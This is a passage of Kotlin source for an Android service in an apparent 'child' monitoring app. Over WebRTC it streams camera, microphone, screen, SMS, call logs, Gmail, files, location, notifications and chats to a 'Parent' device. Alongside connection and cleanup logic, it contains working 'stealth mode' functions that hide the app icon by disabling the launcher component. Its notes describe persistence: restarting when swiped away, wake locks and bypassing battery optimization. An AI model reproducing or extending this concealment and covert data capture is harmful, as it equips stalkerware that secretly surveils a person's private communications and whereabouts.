                initializeConnection() // Reinitialize connection
                Log.d(TAG, "Connection restart completed")
                isReconnecting.set(false) // Clear reconnecting flag
                reconnectionAttempts = 0 // Reset attempts on success

            } catch (_: CancellationException) { // Handle cancellation
                Log.d(TAG, "Restart job cancelled")
                isReconnecting.set(false) // Clear reconnecting flag
            } catch (e: Exception) { // Handle other errors
                Log.e(TAG, "Connection restart failed", e)
                isReconnecting.set(false) // Clear reconnecting flag
                reconnectionAttempts++ // Increment attempts
                Log.d(TAG, "Reconnection attempt #$reconnectionAttempts")

                if (reconnectionAttempts < maxReconnectionAttempts) { // Retry with backoff
                    Log.d(TAG, "Scheduling reconnection attempt #$reconnectionAttempts")
                    // Schedule restart with exponential backoff
                    val delayTime = 1000 * reconnectionAttempts
                    serviceScope.launch { // Launch delayed restart
                        delay(delayTime.toLong()) // Exponential backoff
                        restartConnection() // Retry restart
                    }
                } else {
                    Log.e(TAG, "Max reconnection attempts reached")
                }
            }
        }
    }

    private fun cleanupCurrentConnection() { // Clean up current WebRTC connection and resources
        Log.d(TAG, "Cleaning up current connection...")
        try {
            // Disconnect/failure semantics: clear offer/answer/ICE so next handshake is fresh
            val sig = signaling
            if (sig != null) {
                serviceScope.launch {
                    runCatching { sig.clearSessionData() }
                }
                sig.cleanup()
            }
            signaling = null
            lastOfferSdpHash = 0
            synchronized(pendingRemoteIceLock) { pendingRemoteIce.clear() }
            dataChannel?.close() // Close DataChannel
            dataChannel = null // Clear reference
            deviceStatusMgr?.setStatus(DeviceStatusManager.ONLINE_WAITING)
            
            // Detach data channel from AppLockAlertSender
            nexus.android.child.applock.AppLockAlertSender.detachDataChannel()
            
            peerMgr?.getPeerConnection()?.close() // Close PeerConnection
            cameraCtrl?.stopCamera() // Stop camera
            cameraCtrl = null // Clear camera controller
            micCtrl?.cleanup() // Cleanup microphone (dispose all resources)
            micCtrl = null // Clear microphone controller
            smsSharing?.stopSharing() // Stop SMS sharing
            smsSharing = null // Clear reference
            callLogSharing?.stopSharing() // Stop Call Log sharing
            callLogSharing = null // Clear reference
            gmailSyncManager?.stop()
            fileSystemController?.shutdown()
            fileSystemController = null
            locationController?.stopLocationTracking() // Stop location tracking
            locationController = null // Clear reference
            notificationController?.cleanup() // Stop notification sharing
            notificationController = null // Clear reference
            chatController?.cleanup() // Stop chat monitoring
            chatController = null // Clear reference
            wallpaperController?.cancelWallpaperReceive() // Cancel any ongoing wallpaper receive
            wallpaperController = null // Clear reference
            vibrationFlashController?.stopAll() // Stop all vibration and flash patterns
            vibrationFlashController = null // Clear reference
            Log.d(TAG, "Connection cleanup completed")
        } catch (e: Exception) { // Handle errors
            Log.e(TAG, "Error during cleanup", e)
        }
    }

    private suspend fun setRemoteDescriptionAwait(
        pc: PeerConnection,
        sdp: SessionDescription
    ): Boolean = suspendCancellableCoroutine { cont ->
        pc.setRemoteDescription(object : SdpObserver {
            override fun onSetSuccess() { cont.resume(true) }
            override fun onSetFailure(error: String?) {
                Log.e(TAG, "setRemoteDescription failed: $error")
                cont.resume(false)
            }
            override fun onCreateSuccess(p0: SessionDescription?) {}
            override fun onCreateFailure(p0: String?) {}
        }, sdp)
    }

    private fun flushPendingRemoteIce() {
        val pending = synchronized(pendingRemoteIceLock) {
            if (pendingRemoteIce.isEmpty()) return
            val copy = pendingRemoteIce.toList()
            pendingRemoteIce.clear()
            copy
        }
        pending.forEach { c ->
            peerMgr?.addIceCandidate(c)
        }
    }
    
    /**
     * Handle MediaProjection permission result from TransparentMediaProjectionActivity
     * 
     * FLOW:
     * 1. TransparentMediaProjectionActivity receives permission result
     * 2. Activity broadcasts result to this service
     * 3. This handler receives broadcast
     * 4. If success: Start screen recording with result intent
     * 5. Trigger renegotiation (Child becomes Offerer)
     * 6. Wait for RENEGOTIATION_COMPLETE from Parent
     * 7. Send SCREEN_RECORDING_STARTED confirmation
     */
    private fun handleMediaProjectionResult(intent: Intent) {
        val success = intent.getBooleanExtra(
            nexus.android.child.components.screen.TransparentMediaProjectionActivity.EXTRA_SUCCESS,
            false
        )
        
        if (!success) {
            Log.w(TAG, "❌ MediaProjection permission denied")
            sendDataChannelMessage("SCREEN_RECORDING_PERMISSION_DENIED")
            return
        }
        
        val resultCode = intent.getIntExtra(
            nexus.android.child.components.screen.TransparentMediaProjectionActivity.EXTRA_RESULT_CODE,
            android.app.Activity.RESULT_CANCELED
        )
        
        val data = intent.getParcelableExtra<Intent>(
            nexus.android.child.components.screen.TransparentMediaProjectionActivity.EXTRA_RESULT_DATA
        )
        
        if (data == null) {
            Log.e(TAG, "❌ MediaProjection result data is null")
            sendDataChannelMessage("SCREEN_RECORDING_ERROR: No result data")
            return
        }
        
        Log.d(TAG, "✅ MediaProjection permission granted, starting screen recording")
        
        // CRITICAL: Update foreground service type to include mediaProjection
        // Android 14+ requires this BEFORE calling MediaProjection.start()
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    createNotification(),
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
                Log.d(TAG, "✅ Foreground service type updated to include mediaProjection")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to update foreground service type", e)
            sendDataChannelMessage("SCREEN_RECORDING_ERROR: Service type update failed")
            return
        }
        
        // Start screen recording with result intent
        val renegotiationNeeded = screenRecordingCtrl?.startScreenRecording(resultCode, data) ?: false
        
        if (!renegotiationNeeded) {
            Log.e(TAG, "❌ Failed to start screen recording")
            sendDataChannelMessage("SCREEN_RECORDING_ERROR: Failed to start")
            return
        }
        
        // Trigger renegotiation (Child becomes Offerer)
        performWebRTCRenegotiation {
            // Callback invoked after RENEGOTIATION_COMPLETE received from Parent
            sendDataChannelMessage("SCREEN_RECORDING_STARTED")
            Log.d(TAG, "✅ Screen recording started and confirmed to Parent")
        }
    }

    private fun cleanupEverything() { // Clean up all resources on service destroy
        Log.d(TAG, "Cleaning up everything...")
        cleanupCurrentConnection() // Clean up current connection
        peerMgr = null // Clear peer manager
        cameraCtrl = null // Clear camera controller
        micCtrl = null // Clear microphone controller
        screenRecordingCtrl?.destroy() // Cleanup screen recording
        screenRecordingCtrl = null // Clear screen recording controller
    }

    // Stealth helpers for service context (toggle launcher component)
    private fun activateStealthModeService() { // Hide app icon by disabling launcher component
        try {
            val pm = packageManager // Get package manager
            val componentName = ComponentName(this, MainActivity::class.java) // MainActivity component
            pm.setComponentEnabledSetting( // Disable component
                componentName, // Component to disable
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, // Disable state
                PackageManager.DONT_KILL_APP // Don't kill app
            )
        } catch (e: Exception) { // Handle errors
            Log.e("StealthMode", "Failed to activate stealth mode (service)", e)
        }
    }

    private fun deactivateStealthModeService() { // Show app icon by enabling launcher component
        try { // Enable launcher component
            val pm = packageManager // Get package manager
            val componentName = ComponentName(this, MainActivity::class.java) // MainActivity component
            pm.setComponentEnabledSetting( // Enable component
                componentName, // Component to enable
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED, // Enable state
                PackageManager.DONT_KILL_APP // Don't kill app
            )
        } catch (e: Exception) { // Handle errors
            Log.e("StealthMode", "Failed to deactivate stealth mode (service)", e)
        }
    }

    /**
     * Perform WebRTC renegotiation with ROLE REVERSAL
     * 
     * ARCHITECTURE DECISION:
     * - Initial Connection: Parent = Offerer, Child = Answerer (battery efficient)
     * - Renegotiation: Child = Offerer (temporary), Parent = Answerer
     * 
     * WHY ROLE REVERSAL?
     * - Allows Child to add/remove tracks BEFORE creating offer
     * - Ensures native AudioRecord initialization happens at the right time
     * - Fixes bug where subsequent MIC_ON commands didn't start audio hardware
     * 
     * SIGNALING PATH SWAP:
     * - Child sends offer in 'answer' Firebase path
     * - Parent listens to 'answer' path, detects offer, creates answer
     * - Parent sends answer in 'offer' Firebase path
     * - Child listens to 'offer' path, receives answer, completes renegotiation
     * 
     * FLOW:
     * 1. Child adds/removes track
     * 2. Child creates offer (temporary offerer role)
     * 3. Child sends offer to Firebase 'answer' path
     * 4. Parent receives offer from 'answer' path
     * 5. Parent creates answer
     * 6. Parent sends answer to Firebase 'offer' path
     * 7. Child receives answer from 'offer' path
     * 8. Child sets remote description
     * 9. Parent sends RENEGOTIATION_COMPLETE via DataChannel
     * 10. Child invokes completion callback
     * 
     * @param onComplete Callback invoked when renegotiation is fully complete
     */
    private fun performWebRTCRenegotiation(onComplete: () -> Unit) {
        // Store callback to be invoked when RENEGOTIATION_COMPLETE message arrives
        renegotiationCompleteCallback = onComplete
        
        serviceScope.launch {
            try {
                val pc = peerMgr?.getPeerConnection()
                if (pc == null) {
                    Log.e(TAG, "Cannot renegotiate: PeerConnection is null")
                    return@launch
                }
                
                Log.d(TAG, "🔄 Child creating renegotiation offer (temporary offerer role)")
                
                // Create offer (Child is offerer during renegotiation)
                // At this point, tracks have already been added/removed by MicrophoneController
                val offer = peerMgr?.createOffer()
                if (offer != null) {
                    // CRITICAL: Send offer to Firebase in the 'answer' path (role reversal)
                    // Parent will listen for this in the 'answer' path and create an answer
                    signaling?.sendAnswer(offer)
                    Log.d(TAG, "📤 Renegotiation offer sent to Firebase (in answer path)")
                } else {
                    Log.e(TAG, "Failed to create renegotiation offer")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Renegotiation error", e)
            }
        }
    }

    private fun sendDataChannelMessage(message: String) { // Send message via DataChannel
        if (dataChannel?.state() == DataChannel.State.OPEN) { // Ensure channel is open
            dataChannel?.send(DataChannel.Buffer(ByteBuffer.wrap(message.toByteArray()), false)) // Send as binary
            Log.d(TAG, "DataChannel message sent: $message") // Log sent message
        }
    }
}
/** Notes:
- This service uses a foreground notification to reduce the likelihood of being killed by the system.
- It employs a robust reconnection strategy with exponential backoff to handle network disruptions.
- The service manages its own wake lock to keep the CPU awake for critical operations.
- Stealth mode is implemented by toggling the launcher component visibility.
- All long-running operations are performed in a coroutine scope to avoid blocking the main thread.
- The service cleans up all resources on destruction to prevent memory leaks.
- The service handles task removal (app swiped away) by restarting itself immediately.
- The service requests to ignore battery optimizations to improve reliability on modern Android versions.
*/